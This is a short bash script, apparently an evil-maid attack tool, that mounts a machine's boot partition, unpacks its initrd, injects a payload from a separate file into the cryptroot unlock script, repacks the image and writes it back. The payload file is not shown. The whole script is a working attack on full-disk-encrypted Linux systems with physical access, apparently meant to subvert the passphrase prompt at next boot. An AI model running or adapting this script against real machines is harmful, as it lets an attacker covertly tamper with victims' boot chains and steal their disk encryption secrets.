#!/bin/bash
sudo apt install figlet -y -q3
figlet -t -k -f /usr/share/figlet/small.flf "Evil Maid"
wdir=$(pwd)
sudo apt install dracut-core -y -q3
mkdir ~/target
sudo mount -t ext4 /dev/sda1 ~/target
initrd=$(ls ~/target | grep initrd.img)
mkdir ~/out
cd ~/out
lsinitrd --unpack ~/target/$initrd
cd scripts/local-top
python3 $wdir/edit.py cryptroot $wdir/payload.txt
cd ~/out
find . | cpio -H newc -o | gzip -9 > ~/$initrd
sudo mv ~/$initrd ~/target/$initrd
sudo umount ~/target
echo "Evil Maid Attack Completed"
exit 0